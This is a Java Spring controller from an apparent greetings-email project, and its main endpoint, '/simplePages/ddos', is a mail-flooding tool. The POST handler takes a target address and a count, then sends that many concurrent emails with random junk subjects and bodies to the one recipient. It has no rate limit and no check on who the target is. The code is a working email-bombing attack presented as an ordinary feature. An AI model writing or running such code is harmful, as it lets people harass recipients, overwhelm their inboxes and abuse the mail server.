package ru.project.congratSystem.controller;

import jakarta.mail.MessagingException;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import ru.project.congratSystem.service.EmailSendService;

import java.util.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ThreadLocalRandom;

@Controller
@RequestMapping
public class EmailController {


    private final EmailSendService emailSendService;

    public EmailController(EmailSendService emailSendService) {
        this.emailSendService = emailSendService;
    }

//    @GetMapping("/emailSend")
//    public String showEmailForm() {
//        return "simplePages/emailSend";
//    }



    @GetMapping("/simplePages/ddos")
    public String showDdos() {
        return "simplePages/ddos";
    }

    @PostMapping("/simplePages/ddos")
    public String ddosEmail(@RequestParam("to") String to, @RequestParam("count") int count){
        String allowedChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        Random random = new Random();

        List<CompletableFuture<Void>> futures = new ArrayList<>();
        long startTime = System.currentTimeMillis();
        for (int i = 0; i < count; i++) {
            CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                String randomString1 = ThreadLocalRandom.current()
                        .ints(8, 0, allowedChars.length())
                        .mapToObj(allowedChars::charAt)
                        .collect(StringBuilder::new, StringBuilder::append, StringBuilder::append)
                        .toString();
                String randomString2 = ThreadLocalRandom.current()
                        .ints(8, 0, allowedChars.length())
                        .mapToObj(allowedChars::charAt)
                        .collect(StringBuilder::new, StringBuilder::append, StringBuilder::append)
                        .toString();
                try {
                    emailSendService.sendMessage(to, randomString1, randomString2);
                } catch (MessagingException e) {
                    throw new RuntimeException(e);
                }
            });

            futures.add(future);
        }
        CompletableFuture<Void> allOf = CompletableFuture.allOf(futures.toArray(new CompletableFuture[0]));
        allOf.join();

        long endTime = System.currentTimeMillis();
        long elapsedTime = endTime - startTime;
        System.out.println("Время выполнения: " + elapsedTime + " миллисекунд");
        return "redirect:/simplePages/main";
    }
}
